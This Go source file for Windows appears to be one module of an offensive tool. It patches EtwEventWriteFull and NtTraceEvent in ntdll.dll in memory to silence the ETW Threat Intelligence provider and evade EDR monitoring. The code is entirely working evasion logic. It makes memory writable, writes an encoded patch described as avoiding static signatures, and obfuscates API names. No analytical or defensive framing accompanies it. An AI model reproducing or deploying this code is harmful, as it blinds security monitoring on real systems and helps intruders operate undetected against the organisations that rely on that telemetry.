//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	etwTiProviderGUID = "{A6F70AEF-E9E1-47E3-9613-EAB41B718D2C}"
)

var (
	ntdllETWTI            = syscall.NewLazyDLL("ntdll.dll")
	procEtwEventWriteFull = ntdllETWTI.NewProc(s(SProcEtwFull))
)

// ETW TI GUID bytes in little-endian GUID format
var etwTiGuidBytes = []byte{
	0xEF, 0x0A, 0xF7, 0xA6, // Data1 (little-endian)
	0xE1, 0xE9, // Data2 (little-endian)
	0xE3, 0x47, // Data3 (little-endian)
	0x96, 0x13, 0xEA, 0xB4, 0x1B, 0x71, 0x8D, 0x2C, // Data4
}

func init() {
	registerEvasion("etwti", runEvasionETWTI)
}

func runEvasionETWTI() string {
	if !patchETW {
		return "ETW TI bypass: disabled by EDR strategy"
	}

	result := ""

	// Patch 1: EtwEventWriteFull in ntdll (catches ETW TI provider writes)
	result += patchEtwEventWriteFull()

	// Patch 2: NtTraceEvent (already exists as etw_ntrace_bypass, but do it here too)
	result += patchNtTraceEventETWTI()

	return result
}

func patchEtwEventWriteFull() string {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := kernel32.NewProc(s(SProcGModuleW))
	getProcAddress := kernel32.NewProc(s(SProcGProcAddr))
	virtualProtect := kernel32.NewProc(s(SProcVProtect))

	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "EtwEventWriteFull: ntdll.dll not loaded\n"
	}

	procName := append([]byte("EtwEventWriteFull"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "EtwEventWriteFull: function not found\n"
	}

	// Decode patch to avoid static signature
	patch := decodeBypassPatch()

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "EtwEventWriteFull: VirtualProtect failed\n"
	}

	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	return fmt.Sprintf("EtwEventWriteFull: patched (provider %s blocked)\n", etwTiProviderGUID)
}

func patchNtTraceEventETWTI() string {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := kernel32.NewProc(s(SProcGModuleW))
	getProcAddress := kernel32.NewProc(s(SProcGProcAddr))
	virtualProtect := kernel32.NewProc(s(SProcVProtect))

	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "NtTraceEvent (ETW TI): ntdll.dll not loaded\n"
	}

	procName := append([]byte("NtTraceEvent"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "NtTraceEvent (ETW TI): function not found\n"
	}

	patch := decodeBypassPatch()

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "NtTraceEvent (ETW TI): VirtualProtect failed\n"
	}

	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	return "NtTraceEvent (ETW TI): patched\n"
}
